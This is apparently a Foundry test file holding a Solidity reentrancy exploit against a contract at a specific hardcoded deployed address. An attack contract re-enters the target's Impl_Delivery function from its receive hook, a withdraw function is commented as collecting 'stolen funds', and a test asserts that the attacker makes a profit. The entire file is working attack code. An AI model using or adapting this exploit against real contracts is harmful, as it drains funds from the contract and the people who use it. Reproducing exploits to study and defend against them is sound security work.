// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for the vulnerable contract
interface IVulnerable {
    function Impl_Delivery() external payable;
}

// Attack contract with reentrancy capability
contract AttackContract {
    IVulnerable public target;
    uint256 private counter = 0;
    uint256 private constant MAX_REENTRANCY = 10;

    constructor(address _target) {
        target = IVulnerable(_target);
    }

    // Main attack function
    function attack() external payable {
        // Start the reentrancy attack
        target.Impl_Delivery{value: 1 ether}();
    }

    // Fallback function that gets called during token transfer
    receive() external payable {
        if (counter < MAX_REENTRANCY && address(target).balance >= 1 ether) {
            counter++;
            // Re-enter the vulnerable function
            target.Impl_Delivery{value: 0}();
        }
    }

    // Withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Helper to check contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2815d3272baE3ebde5D7c128Eea5f4A8da402783;
    address attacker = address(this);
    AttackContract attackContract;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Deploy attack contract
        attackContract = new AttackContract(TARGET);

        // Fund attack contract with native tokens for the swap
        deal(address(attackContract), 10 ether);

        // Label addresses for debugging
        vm.label(address(attackContract), "AttackContract");
        vm.label(TARGET, "VulnerableContract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Execute the attack through our attack contract
        attackContract.attack();

        // Withdraw funds from attack contract to attacker
        attackContract.withdraw();

        // Verify profit
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

